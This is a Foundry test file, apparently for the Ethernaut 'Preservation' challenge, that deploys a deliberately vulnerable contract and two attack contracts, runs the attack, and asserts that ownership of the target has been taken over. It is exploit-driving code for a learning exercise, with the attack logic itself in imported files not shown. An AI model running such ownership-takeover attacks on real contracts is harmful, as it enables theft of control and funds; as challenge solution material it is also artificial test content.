pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/16Preservation/Task.sol";
import "../../src/16Preservation/Solution.sol";
import "../../src/16Preservation/Solution2.sol";



contract TestPreservation is Test {

    Preservation task;
    LibraryContractAttack solution1;
    PreservationAttack solution2;
    LibraryContract lib1;
    LibraryContract lib2;

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        task = new Preservation(address(lib1), address(lib2));
        solution1 = new LibraryContractAttack();
        solution2 = new PreservationAttack(address(task));
    }

    function test_preservation() public {
        console.logAddress(address(task));
        console.logAddress(address(solution1));
        console.logAddress(address(solution2));

        string memory bef = '-------before-----';
        console.logString(bef);

        console.logAddress(task.timeZone1Library());
        console.logAddress(task.timeZone2Library());
        console.logAddress(task.owner());        

        string memory aft = '-------after-----';
        console.logString(aft);

        solution2.setFakeLibrary(address(solution1));
        vm.roll(block.number + 1);
        solution2.attack();

        console.logAddress(task.timeZone1Library());
        console.logAddress(task.timeZone2Library());
        console.logAddress(task.owner());        

        assert(task.owner() == msg.sender);
    }
}
